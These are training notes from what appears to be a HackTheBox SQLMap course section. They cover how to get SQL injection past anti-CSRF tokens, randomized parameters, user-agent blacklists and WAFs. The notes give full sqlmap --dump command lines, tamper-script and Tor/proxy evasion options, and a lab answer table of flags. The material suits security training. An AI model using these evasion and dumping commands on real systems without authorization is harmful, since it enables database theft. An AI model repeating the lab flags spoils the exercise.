# NOTE — Bypassing Web Application Protections

## ID
405

## Module
SQLMap Essentials

## Kind
notes

## Title
Section 9 — Bypassing Web Application Protections

## Description
Covers SQLMap's built-in mechanisms for bypassing anti-CSRF tokens, unique value requirements, user-agent blacklists, WAFs/IPS, and introduces tamper scripts for payload obfuscation.

## Tags
sqlmap, sqli, csrf-bypass, waf-bypass, tamper-scripts, user-agent

## Commands
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>' --data 'id=1&<TOKEN_NAME>=<TOKEN_VALUE>' --csrf-token=<TOKEN_NAME> --batch --dump
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?id=1&<PARAM>=<VALUE>' --randomize=<PARAM> --batch --dump
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?id=1&h=<HASH>' --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch --dump
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>' --data='id=1' --random-agent --batch --dump
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?id=1' --tamper=<SCRIPT> --batch --dump
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?id=1' --tamper=between,randomcase --batch --dump
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>?id=1' --proxy="socks4://<PROXY_IP>:<PORT>" --batch --dump
- sqlmap --list-tampers

## What This Section Covers
Real-world targets have protections — CSRF tokens, unique request IDs, user-agent filtering, WAFs. SQLMap has built-in switches to handle each one. The key is identifying which protection is active (inspect the page/request in DevTools) and applying the correct bypass flag. Tamper scripts are the most flexible tool, letting you chain Python-based payload transformations to evade pattern-matching filters.

## Methodology

1. **Identify the protection** — visit the target case in a browser. Check for hidden form fields (CSRF tokens), URL parameters with random values (unique IDs), or immediate 403/406 errors (WAF/user-agent blocking). Use DevTools Network tab to inspect request/response details.

2. **Anti-CSRF token** — find the token parameter name in the form data (e.g., `t0ken`). Pass it with `--csrf-token=<NAME>` so SQLMap fetches a fresh token from the page before each request:
   `sqlmap -u '...' --data 'id=1&t0ken=<VALUE>' --csrf-token=t0ken --batch --dump`

3. **Unique value parameter** — if a parameter must be unique per request (e.g., `uid`), use `--randomize=<PARAM>` to auto-generate a random value each time:
   `sqlmap -u '...?id=1&uid=12345' --randomize=uid --batch --dump`

4. **Calculated parameter** — if a parameter is a hash of another (e.g., `h=MD5(id)`), use `--eval` with inline Python:
   `sqlmap -u '...?id=1&h=<HASH>' --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch --dump`

5. **User-agent blacklist** — if SQLMap's default UA gets blocked (5XX errors from the start), swap it with `--random-agent`:
   `sqlmap -u '...' --data='id=1' --random-agent --batch --dump`

6. **WAF / character filtering** — use `--tamper` scripts to transform payloads. Common ones:
   - `between` — replaces `=` and `>` operators to bypass character filters
   - `randomcase` — randomizes keyword casing (`SELECT` → `SeLeCt`)
   - `space2comment` — replaces spaces with `/**/`
   - Chain multiple: `--tamper=between,randomcase`

7. **IP concealment** — use `--proxy` for a single proxy, `--proxy-file` for a rotation list, or `--tor` + `--check-tor` for Tor anonymization.

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Contents of flag8 (Case #8) | `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}` | `--csrf-token=t0ken` — POST form with anti-CSRF token named `t0ken`, grab value from DevTools Network tab |
| Q2: Contents of flag9 (Case #9) | `HTB{700_much_r4nd0mn355_f0r_my_74573}` | `--randomize=uid` — GET param `uid` needs a unique value per request |
| Q3: Contents of flag10 (Case #10) | `HTB{y37_4n07h3r_r4nd0m1z3}` | `--random-agent` — POST form, SQLMap's default user-agent is blacklisted |
| Q4: Contents of flag11 (Case #11) | `HTB{5p3c14l_ch4r5_n0_m0r3}` | `--tamper=between` — GET param, app filters `=` and `>` characters |

## Key Takeaways
- Always check the page in a browser + DevTools first to identify which protection is in play before throwing SQLMap at it.
- `--csrf-token` auto-parses the response for fresh tokens — you just need to tell it the parameter name. If the name contains `csrf`, `xsrf`, or `token`, SQLMap will prompt you automatically.
- Tamper scripts can be chained (`--tamper=a,b,c`) and run in priority order to prevent conflicts. Use `--list-tampers` to see all available scripts with descriptions.
- `--random-agent` should be your default habit on real targets — SQLMap's default UA (`sqlmap/1.x.x`) is trivially fingerprinted.
- WAF detection happens automatically at the start of every SQLMap run using a canary request with a fake parameter. Use `--skip-waf` to suppress this check if you want less noise.

## Gotchas
- For Case #8, you need to grab the actual token value from DevTools — you can't just make one up. SQLMap will refresh it on subsequent requests, but the first one needs to be valid.
- `--randomize` only works for parameters where any random value is accepted. If the server validates the value against a session, you need `--csrf-token` instead.
- Tamper scripts are DBMS-specific — `space2hash` and `modsecurityversioned` are MySQL-only. Using the wrong one for the target DBMS will break payloads silently.
- `--tor` requires Tor to be installed and running locally (SOCKS proxy on port 9050/9150). It doesn't set up Tor for you.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|sqlmap-fundamentals]]  
← [[08-advanced-enumeration]] | [[10-os-exploitation]] →
<!-- AUTO-LINKS-END -->
